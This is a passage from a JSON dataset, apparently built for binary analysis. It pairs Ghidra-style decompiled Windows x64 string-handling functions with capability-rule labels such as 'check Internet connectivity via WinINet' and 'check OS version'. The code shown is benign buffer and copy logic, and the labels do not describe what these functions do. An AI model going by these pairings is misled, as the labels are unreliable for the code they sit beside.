        "decompiled_code": "\nint64_t * fcn.140075ae0(uchar *arg1, int64_t arg2)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    uchar *puVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    ulong in_R9;\n    \n    if ((arg2 == 0) || (arg1 != NULL)) {\n        arg2 = arg2 - arg1;\n        piVar1 = fcn.140076110(arg2, 0);\n        piVar2 = piVar1 + 3;\n        if (arg2 == 1) {\n            *(piVar1 + 3) = *arg1;\n        }\n        else if (arg2 != 0) {\n            piVar2 = sub.msvcrt.dll_memcpy(piVar2, arg1, arg2);\n        }\n        *(piVar1 + 2) = 0;\n        *piVar1 = arg2;\n        *(piVar1 + arg2 + 0x18) = 0;\n        return piVar2;\n    }\n    puVar3 = 0x1400fe4e0;\n    iVar4 = arg2;\n    fcn.1400b7080(0x1400fe4e0);\n    if ((iVar4 == 0) || (puVar3 != NULL)) {\n        iVar4 = iVar4 - puVar3;\n        piVar1 = fcn.140076110(iVar4, 0);\n        piVar2 = piVar1 + 3;\n        if (iVar4 == 1) {\n            *(piVar1 + 3) = *puVar3;\n        }\n        else if (iVar4 != 0) {\n            piVar2 = sub.msvcrt.dll_memcpy(piVar2, puVar3, iVar4, in_R9, arg2);\n        }\n        *(piVar1 + 2) = 0;\n        *piVar1 = iVar4;\n        *(piVar1 + iVar4 + 0x18) = 0;\n        return piVar2;\n    }\n    puVar3 = 0x1400fea90;\n    iVar5 = iVar4;\n    fcn.1400b7080(0x1400fea90);\n    if ((iVar5 == 0) || (puVar3 != NULL)) {\n        iVar5 = iVar5 - puVar3;\n        piVar1 = fcn.140076110(iVar5, 0);\n        piVar2 = piVar1 + 3;\n        if (iVar5 == 1) {\n            *(piVar1 + 3) = *puVar3;\n        }\n        else if (iVar5 != 0) {\n            piVar2 = sub.msvcrt.dll_memcpy(piVar2, puVar3, iVar5, in_R9, iVar4);\n        }\n        *(piVar1 + 2) = 0;\n        *piVar1 = iVar5;\n        *(piVar1 + iVar5 + 0x18) = 0;\n        return piVar2;\n    }\n    puVar3 = 0x140101340;\n    iVar4 = iVar5;\n    fcn.1400b7080(0x140101340);\n    if ((iVar4 != 0) && (puVar3 == NULL)) {\n        fcn.1400b7080(0x1400fd8c0);\n        return 0x1400fb3a0;\n    }\n    iVar4 = iVar4 - puVar3;\n    piVar1 = fcn.140076110(iVar4, 0);\n    piVar2 = piVar1 + 3;\n    if (iVar4 == 1) {\n        *(piVar1 + 3) = *puVar3;\n    }\n    else if (iVar4 != 0) {\n        piVar2 = sub.msvcrt.dll_memcpy(piVar2, puVar3, iVar4, in_R9, iVar5);\n    }\n    *(piVar1 + 2) = 0;\n    *piVar1 = iVar4;\n    *(piVar1 + iVar4 + 0x18) = 0;\n    return piVar2;\n}\n",
        "token_count": 908
    },
    "140075b6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.140075b60(uchar *arg1, int64_t arg2)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    uchar *puVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    ulong in_R9;\n    \n    if ((arg2 == 0) || (arg1 != NULL)) {\n        arg2 = arg2 - arg1;\n        piVar1 = fcn.140076110(arg2, 0);\n        piVar2 = piVar1 + 3;\n        if (arg2 == 1) {\n            *(piVar1 + 3) = *arg1;\n        }\n        else if (arg2 != 0) {\n            piVar2 = sub.msvcrt.dll_memcpy(piVar2, arg1, arg2);\n        }\n        *(piVar1 + 2) = 0;\n        *piVar1 = arg2;\n        *(piVar1 + arg2 + 0x18) = 0;\n        return piVar2;\n    }\n    puVar3 = 0x1400fea90;\n    iVar4 = arg2;\n    fcn.1400b7080(0x1400fea90);\n    if ((iVar4 != 0) && (puVar3 == NULL)) {\n        puVar3 = 0x140101340;\n        iVar5 = iVar4;\n        fcn.1400b7080(0x140101340);\n        if ((iVar5 != 0) && (puVar3 == NULL)) {\n            fcn.1400b7080(0x1400fd8c0);\n            return 0x1400fb3a0;\n        }\n        iVar5 = iVar5 - puVar3;\n        piVar1 = fcn.140076110(iVar5, 0);\n        piVar2 = piVar1 + 3;\n        if (iVar5 == 1) {\n            *(piVar1 + 3) = *puVar3;\n        }\n        else if (iVar5 != 0) {\n            piVar2 = sub.msvcrt.dll_memcpy(piVar2, puVar3, iVar5, in_R9, iVar4);\n        }\n        *(piVar1 + 2) = 0;\n        *piVar1 = iVar5;\n        *(piVar1 + iVar5 + 0x18) = 0;\n        return piVar2;\n    }\n    iVar4 = iVar4 - puVar3;\n    piVar1 = fcn.140076110(iVar4, 0);\n    piVar2 = piVar1 + 3;\n    if (iVar4 == 1) {\n        *(piVar1 + 3) = *puVar3;\n    }\n    else if (iVar4 != 0) {\n        piVar2 = sub.msvcrt.dll_memcpy(piVar2, puVar3, iVar4, in_R9, arg2);\n    }\n    *(piVar1 + 2) = 0;\n    *piVar1 = iVar4;\n    *(piVar1 + iVar4 + 0x18) = 0;\n    return piVar2;\n}\n",
        "token_count": 691
    },
    "140075be": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.140075be0(uchar *arg1, int64_t arg2)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    uchar *puVar3;\n    int64_t iVar4;\n    ulong in_R9;\n    \n    if ((arg2 == 0) || (arg1 != NULL)) {\n        arg2 = arg2 - arg1;\n        piVar1 = fcn.140076110(arg2, 0);\n        piVar2 = piVar1 + 3;\n        if (arg2 == 1) {\n            *(piVar1 + 3) = *arg1;\n        }\n        else if (arg2 != 0) {\n            piVar2 = sub.msvcrt.dll_memcpy(piVar2, arg1, arg2);\n        }\n        *(piVar1 + 2) = 0;\n        *piVar1 = arg2;\n        *(piVar1 + arg2 + 0x18) = 0;\n        return piVar2;\n    }\n    puVar3 = 0x140101340;\n    iVar4 = arg2;\n    fcn.1400b7080(0x140101340);\n    if ((iVar4 != 0) && (puVar3 == NULL)) {\n        fcn.1400b7080(0x1400fd8c0);\n        return 0x1400fb3a0;\n    }\n    iVar4 = iVar4 - puVar3;\n    piVar1 = fcn.140076110(iVar4, 0);\n    piVar2 = piVar1 + 3;\n    if (iVar4 == 1) {\n        *(piVar1 + 3) = *puVar3;\n    }\n    else if (iVar4 != 0) {\n        piVar2 = sub.msvcrt.dll_memcpy(piVar2, puVar3, iVar4, in_R9, arg2);\n    }\n    *(piVar1 + 2) = 0;\n    *piVar1 = iVar4;\n    *(piVar1 + iVar4 + 0x18) = 0;\n    return piVar2;\n}\n",
        "token_count": 471
    },
    "140075c6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.140075c60(uchar *arg1, int64_t arg2)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    \n    if ((arg2 != 0) && (arg1 == NULL)) {\n        fcn.1400b7080(0x1400fd8c0);\n        return 0x1400fb3a0;\n    }\n    arg2 = arg2 - arg1;\n    piVar1 = fcn.140076110(arg2, 0);\n    piVar2 = piVar1 + 3;\n    if (arg2 == 1) {\n        *(piVar1 + 3) = *arg1;\n    }\n    else if (arg2 != 0) {\n        piVar2 = sub.msvcrt.dll_memcpy(piVar2, arg1, arg2);\n    }\n    *(piVar1 + 2) = 0;\n    *piVar1 = arg2;\n    *(piVar1 + arg2 + 0x18) = 0;\n    return piVar2;\n}\n",
        "token_count": 240
    },
    "140075d8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.140075d80(int64_t *arg1, int64_t arg2, int64_t arg3, uchar *arg4)\n\n{\n    int64_t *arg1_00;\n    int64_t arg2_00;\n    int64_t unaff_RBX;\n    char in_stack_00000028;\n    \n    arg2_00 = *arg1;\n    if ((arg3 + 0x3ffffffffffffff9) - *(arg2_00 + -0x18) < arg4) {\n        arg1_00 = 0x1400fd861;\n        fcn.1400b7170(0x1400fd861);\n        fcn.140077920(arg1_00, arg2_00, arg3, unaff_RBX);\n        if (unaff_RBX != 0) {\n            if (unaff_RBX == 1) {\n                *(arg2_00 + *arg1_00) = *arg4;\n                return arg1_00;\n            }\n            sub.msvcrt.dll_memcpy(arg2_00 + *arg1_00, arg4, unaff_RBX);\n        }\n        return arg1_00;\n    }\n    fcn.140077920(arg1, arg2, arg3, arg4);\n    if (arg4 != NULL) {\n        if (arg4 == 0x1) {\n            *(arg2 + *arg1) = in_stack_00000028;\n            return arg1;\n        }\n        sub.msvcrt.dll_memset(arg2 + *arg1, in_stack_00000028, arg4);\n    }\n    return arg1;\n}\n",
        "token_count": 357
    },
    "1400760a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.1400760a0(int64_t *arg1, ulong arg2, int64_t arg3)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    \n    piVar1 = fcn.140076110(*arg1 + arg3, arg1[1]);\n    iVar3 = *arg1;\n    piVar2 = piVar1 + 3;\n    if (iVar3 != 0) {\n        if (iVar3 == 1) {\n            *(piVar1 + 3) = *(arg1 + 3);\n            iVar3 = *arg1;\n        }\n        else {\n            piVar2 = sub.msvcrt.dll_memcpy(piVar2, arg1 + 3);\n            iVar3 = *arg1;\n        }\n    }\n    *(piVar1 + 2) = 0;\n    *piVar1 = iVar3;\n    *(piVar1 + iVar3 + 0x18) = 0;\n    return piVar2;\n}\n",
        "token_count": 230
    },
    "14007611": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t fcn.140076110(uint64_t arg1, uint64_t arg2)\n\n{\n    int64_t iVar1;\n    int64_t *arg1_00;\n    int64_t iVar2;\n    \n    if (arg1 < 0x3ffffffffffffffa) {\n        if (arg2 < arg1) {\n            if (arg1 < arg2 * 2) {\n                arg1 = arg2 * 2;\n            }\n            if (((0x1000 < arg1 + 0x39) && (arg2 < arg1)) &&\n               (arg1 = (arg1 + 0x1000) - (arg1 + 0x39 & 0xfff),  0x3ffffffffffffff9 < arg1)) {\n                arg1 = 0x3ffffffffffffff9;\n            }\n        }\n        iVar1 = fcn.1400b6520(arg1 + 0x19);\n        *(iVar1 + 8) = arg1;\n        *(iVar1 + 0x10) = 0;\n        return iVar1;\n    }\n    arg1_00 = 0x1400fd835;\n    fcn.1400b7170(0x1400fd835);\n    iVar1 = *arg1_00;\n    iVar2 = *(iVar1 + -0x18) + -1;\n    if ((*(iVar1 + -8) < 0) || (*(iVar1 + -0x18) == 0)) {\n        return iVar1 + iVar2;\n    }\n    if (**0x140102a70 == 0) {\n        if (*(iVar1 + -8) < 1) goto code_r0x0001400761dd;\n    }\n    else if (*(iVar1 + -8) < 1) {\n        iVar1 = *arg1_00;\n        goto code_r0x0001400761dd;\n    }\n    fcn.140077920(arg1_00, 0, 0, 0);\n    iVar1 = *arg1_00;\ncode_r0x0001400761dd:\n    *(iVar1 + -8) = 0xffffffff;\n    return iVar1 + iVar2;\n}\n",
        "token_count": 473
    },
    "14007792": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.140077920(int64_t *arg1, int64_t arg2, int64_t arg3, int64_t arg4)\n\n{\n    int32_t *piVar1;\n    uchar *puVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    uint64_t arg2_00;\n    uint64_t arg1_00;\n    int64_t iVar6;\n    \n    piVar1 = *0x140102a70;\n    iVar4 = *arg1;\n    iVar5 = arg3 + arg2;\n    arg2_00 = *(iVar4 + -0x10);\n    arg1_00 = (arg4 - arg3) + *(iVar4 + -0x18);\n    iVar6 = *(iVar4 + -0x18) - iVar5;\n    if (arg1_00 <= arg2_00) {\n        if (**0x140102a70 == 0) {\n            if (*(iVar4 + -8) < 1) {\ncode_r0x000140077a43:\n                if ((iVar6 != 0) && (arg4 != arg3)) {\n                    puVar2 = iVar4 + arg4 + arg2;\n                    if (iVar6 == 1) {\n                        *puVar2 = *(iVar4 + iVar5);\n                        iVar4 = *arg1;\n                    }\n                    else {\n                        sub.msvcrt.dll_memmove(puVar2, iVar4 + iVar5, iVar6);\n                        iVar4 = *arg1;\n                    }\n                }\n                goto code_r0x0001400779d5;\n            }\n        }\n        else {\n            if (*(iVar4 + -8) < 1) {\n                iVar4 = *arg1;\n                goto code_r0x000140077a43;\n            }\n            arg2_00 = *(*arg1 + -0x10);\n        }\n    }\n    iVar4 = fcn.140076110(arg1_00, arg2_00);\n    if (arg2 == 0) {\ncode_r0x0001400779b6:\n        if (iVar6 == 0) goto code_r0x0001400779bb;\ncode_r0x0001400779f8:\n        puVar2 = iVar4 + arg2 + 0x18 + arg4;\n        if (iVar6 == 1) {\n            *puVar2 = *(iVar5 + *arg1);\n            goto code_r0x0001400779bb;\n        }\n        sub.msvcrt.dll_memcpy(puVar2, iVar5 + *arg1, iVar6);\n        iVar5 = *arg1;\n        if (*piVar1 != 0) goto code_r0x000140077a23;\ncode_r0x0001400779c5:\n        iVar3 = *(iVar5 + -8);\n        *(iVar5 + -8) = iVar3 + -1;\n    }\n    else {\n        if (arg2 != 1) {\n            sub.msvcrt.dll_memcpy(iVar4 + 0x18, *arg1, arg2);\n            goto code_r0x0001400779b6;\n        }\n        *(iVar4 + 0x18) = **arg1;\n        if (iVar6 != 0) goto code_r0x0001400779f8;\ncode_r0x0001400779bb:\n        iVar5 = *arg1;\n        if (*piVar1 == 0) goto code_r0x0001400779c5;\ncode_r0x000140077a23:\n        LOCK();\n        piVar1 = iVar5 + -8;\n        iVar3 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar3 < 1) {\n        fcn.1400b64d0(iVar5 + -0x18);\n    }\n    iVar4 = iVar4 + 0x18;\n    *arg1 = iVar4;\ncode_r0x0001400779d5:\n    *(iVar4 + -8) = 0;\n    *(iVar4 + -0x18) = arg1_00;\n    *(iVar4 + arg1_00) = 0;\n    return;\n}\n",
        "token_count": 915
    },
    "14007650": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.140076500(int64_t *arg1, uchar *arg2, ulong *arg3)\n\n{\n    int32_t *piVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    uchar *puVar4;\n    int64_t *arg1_00;\n    int64_t iVar5;\n    ulong *puVar6;\n    int64_t iVar7;\n    \n    if (arg3 == NULL) {\n        return arg1;\n    }\n    puVar4 = *arg1;\n    iVar7 = *(puVar4 + -0x18);\n    puVar6 = 0x3ffffffffffffff9 - iVar7;\n    if (puVar6 < arg3) {\n        arg1_00 = 0x1400fd8ea;\n        fcn.1400b7170(0x1400fd8ea);\n        puVar4 = *puVar6;\n        iVar7 = *(puVar4 + -0x18);\n        if (iVar7 == 0) {\n            return arg1_00;\n        }\n        iVar5 = *arg1_00;\n        iVar3 = *(iVar5 + -0x18);\n        uVar2 = iVar3 + iVar7;\n        if (uVar2 <= *(iVar5 + -0x10)) {\n            if (**0x140102a70 == 0) {\n                if (*(iVar5 + -8) < 1) goto code_r0x000140076650;\n            }\n            else if (*(iVar5 + -8) < 1) {\n                iVar5 = *arg1_00;\n                puVar4 = *puVar6;\n                iVar3 = *(iVar5 + -0x18);\n                goto code_r0x000140076650;\n            }\n        }\n        fcn.140077810(arg1_00, uVar2);\n        iVar5 = *arg1_00;\n        puVar4 = *puVar6;\n        iVar3 = *(iVar5 + -0x18);\ncode_r0x000140076650:\n        if (iVar7 == 1) {\n            *(iVar5 + iVar3) = *puVar4;\n        }\n        else {\n            sub.msvcrt.dll_memcpy(iVar5 + iVar3, puVar4, iVar7);\n        }\n        iVar7 = *arg1_00;\n        *(iVar7 + -8) = 0;\n        *(iVar7 + -0x18) = uVar2;\n        *(iVar7 + uVar2) = 0;\n        return arg1_00;\n    }\n    uVar2 = arg3 + iVar7;\n    if (*(puVar4 + -0x10) < uVar2) {\ncode_r0x000140076541:\n        if ((arg2 < puVar4) || (puVar4 + *(puVar4 + -0x18) < arg2)) {\n            fcn.140077810(arg1, uVar2);\n            puVar4 = *arg1;\n            iVar7 = *(puVar4 + -0x18);\ncode_r0x000140076564:\n            puVar4 = puVar4 + iVar7;\n            goto joined_r0x0001400765bf;\n        }\n        iVar7 = arg2 - puVar4;\n        fcn.140077810(arg1, uVar2);\n        puVar4 = *arg1;\n        arg2 = puVar4 + iVar7;\n    }\n    else {\n        if (**0x140102a70 == 0) {\n            if (0 < *(puVar4 + -8)) goto code_r0x000140076541;\n            goto code_r0x000140076564;\n        }\n        piVar1 = puVar4 + -8;\n        puVar4 = *arg1;\n        if (0 < *piVar1) goto code_r0x000140076541;\n    }\n    puVar4 = puVar4 + *(puVar4 + -0x18);\njoined_r0x0001400765bf:\n    if (arg3 == 0x1) {\n        *puVar4 = *arg2;\n    }\n    else {\n        sub.msvcrt.dll_memcpy(puVar4, arg2, arg3);\n    }\n    iVar7 = *arg1;\n    *(iVar7 + -8) = 0;\n    *(iVar7 + -0x18) = uVar2;\n    *(iVar7 + uVar2) = 0;\n    return arg1;\n}\n",
        "token_count": 970
    },
    "14007661": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.140076610(int64_t *arg1, ulong *arg2)\n\n{\n    uint64_t arg2_00;\n    int64_t iVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    uchar *puVar4;\n    \n    puVar4 = *arg2;\n    iVar1 = *(puVar4 + -0x18);\n    if (iVar1 == 0) {\n        return arg1;\n    }\n    iVar3 = *arg1;\n    iVar2 = *(iVar3 + -0x18);\n    arg2_00 = iVar2 + iVar1;\n    if (arg2_00 <= *(iVar3 + -0x10)) {\n        if (**0x140102a70 == 0) {\n            if (*(iVar3 + -8) < 1) goto code_r0x000140076650;\n        }\n        else if (*(iVar3 + -8) < 1) {\n            iVar3 = *arg1;\n            puVar4 = *arg2;\n            iVar2 = *(iVar3 + -0x18);\n            goto code_r0x000140076650;\n        }\n    }\n    fcn.140077810(arg1, arg2_00);\n    iVar3 = *arg1;\n    puVar4 = *arg2;\n    iVar2 = *(iVar3 + -0x18);\ncode_r0x000140076650:\n    if (iVar1 == 1) {\n        *(iVar3 + iVar2) = *puVar4;\n    }\n    else {\n        sub.msvcrt.dll_memcpy(iVar3 + iVar2, puVar4, iVar1);\n    }\n    iVar1 = *arg1;\n    *(iVar1 + -8) = 0;\n    *(iVar1 + -0x18) = arg2_00;\n    *(iVar1 + arg2_00) = 0;\n    return arg1;\n}\n",
        "token_count": 414
    },
    "1400767c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.1400767c0(int64_t *arg1, int64_t *arg2, ulong arg3)\n\n{\n    uint64_t arg2_00;\n    int64_t iVar1;\n    int64_t iVar2;\n    int64_t *piVar3;\n    int64_t *piVar4;\n    \n    if (arg2 == NULL) {\n        return arg1;\n    }\n    iVar2 = *arg1;\n    iVar1 = *(iVar2 + -0x18);\n    piVar4 = 0x3ffffffffffffff9 - iVar1;\n    if (piVar4 < arg2) {\n        piVar3 = 0x1400fd8ea;\n        fcn.1400b7170(0x1400fd8ea);\n        iVar2 = *piVar3;\n        if (*(iVar2 + -8) < 0) {\n            *(iVar2 + -8) = 0;\n        }\n        iVar1 = *piVar4;\n        if (*(iVar1 + -8) < 0) {\n            *(iVar1 + -8) = 0;\n        }\n        *piVar3 = iVar1;\n        *piVar4 = iVar2;\n        return piVar3;\n    }\n    arg2_00 = arg2 + iVar1;\n    if (arg2_00 <= *(iVar2 + -0x10)) {\n        if (**0x140102a70 == 0) {\n            if (*(iVar2 + -8) < 1) goto code_r0x000140076825;\n        }\n        else if (*(iVar2 + -8) < 1) {\n            iVar2 = *arg1;\n            iVar1 = *(iVar2 + -0x18);\n            goto code_r0x000140076825;\n        }\n    }\n    fcn.140077810(arg1, arg2_00);\n    iVar2 = *arg1;\n    iVar1 = *(iVar2 + -0x18);\ncode_r0x000140076825:\n    if (arg2 == 0x1) {\n        *(iVar2 + iVar1) = arg3;\n    }\n    else {\n        sub.msvcrt.dll_memset(iVar2 + iVar1, arg3, arg2);\n    }\n    iVar2 = *arg1;\n    *(iVar2 + -8) = 0;\n    *(iVar2 + -0x18) = arg2_00;\n    *(iVar2 + arg2_00) = 0;\n    return arg1;\n}\n",
        "token_count": 543
    },
    "14007690": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t ** fcn.140076900(int64_t **arg1, int64_t **arg2, int64_t *arg3)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    int64_t *piVar3;\n    int32_t *piVar4;\n    int64_t *piVar5;\n    int64_t **ppiVar6;\n    uchar auStack81 [9];\n    int64_t *piStack72;\n    int64_t **ppiStack64;\n    \n    ppiVar6 = *arg1;\n    piVar5 = ppiVar6[-3];\n    if (0x3ffffffffffffff9 < arg3) {\n        ppiVar6 = 0x1400fd894;\n        ppiStack64 = 0x140076a49;\n        fcn.1400b7170(0x1400fd894);\n        piVar4 = *0x140102a70;\n        piVar5 = *arg2;\n        if (*ppiVar6 != piVar5) {\n            piStack72 = arg3;\n            ppiStack64 = arg1;\n            if (*(piVar5 + -1) < 0) {\n                piVar5 = fcn.1400760a0(piVar5 + -3, &stack0xffffffffffffffaf, 0);\n                piVar3 = *ppiVar6;\n                iVar2 = **0x140102a70;\n            }\n            else {\n                if (**0x140102a70 == 0) {\n                    *(piVar5 + -1) = *(piVar5 + -1) + 1;\n                }\n                else {\n                    LOCK();\n                    *(piVar5 + -1) = *(piVar5 + -1) + 1;\n                }\n                iVar2 = *piVar4;\n                piVar3 = *ppiVar6;\n            }\n            if (iVar2 == 0) {\n                iVar2 = *(piVar3 + -1);\n                *(piVar3 + -1) = iVar2 + -1;\n            }\n            else {\n                LOCK();\n                piVar1 = piVar3 + -1;\n                iVar2 = *piVar1;\n                *piVar1 = *piVar1 + -1;\n            }\n            if (iVar2 < 1) {\n                fcn.1400b64d0(piVar3 + -3);\n            }\n            *ppiVar6 = piVar5;\n            return ppiVar6;\n        }\n        return ppiVar6;\n    }\n    if ((arg2 < ppiVar6) || (ppiVar6 + piVar5 < arg2)) {\ncode_r0x0001400769b8:\n        ppiStack64 = 0x1400769c5;\n        fcn.140077920(arg1, 0, piVar5, arg3);\n        if (arg3 == NULL) {\n            return arg1;\n        }\n        if (arg3 == 0x1) {\n            **arg1 = *arg2;\n            return arg1;\n        }\n        ppiStack64 = 0x1400769de;\n        sub.msvcrt.dll_memcpy(*arg1, arg2, arg3);\n        return arg1;\n    }\n    if (**0x140102a70 == 0) {\n        if (0 < *(ppiVar6 + -1)) goto code_r0x0001400769b8;\n    }\n    else {\n        if (0 < *(ppiVar6 + -1)) {\n            piVar5 = (*arg1)[-3];\n            goto code_r0x0001400769b8;\n        }\n        ppiVar6 = *arg1;\n    }\n    if (arg2 - ppiVar6 < arg3) {\n        if (arg2 == ppiVar6) goto code_r0x000140076980;\n        if (arg3 != 0x1) {\n            ppiStack64 = 0x140076979;\n            sub.msvcrt.dll_memmove(ppiVar6, arg2, arg3);\n            ppiVar6 = *arg1;\n            goto code_r0x000140076980;\n        }\n    }\n    else if (arg3 != 0x1) {\n        if (arg3 != NULL) {\n            ppiStack64 = 0x140076a1a;\n            sub.msvcrt.dll_memcpy(ppiVar6, arg2, arg3);\n            ppiVar6 = *arg1;\n        }\n        goto code_r0x000140076980;\n    }\n    *ppiVar6 = *arg2;\n    ppiVar6 = *arg1;\ncode_r0x000140076980:\n    *(ppiVar6 + -1) = 0;\n    ppiVar6[-3] = arg3;\n    *(ppiVar6 + arg3) = 0;\n    return arg1;\n}\n",
        "token_count": 1051
    },
    "1400770c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
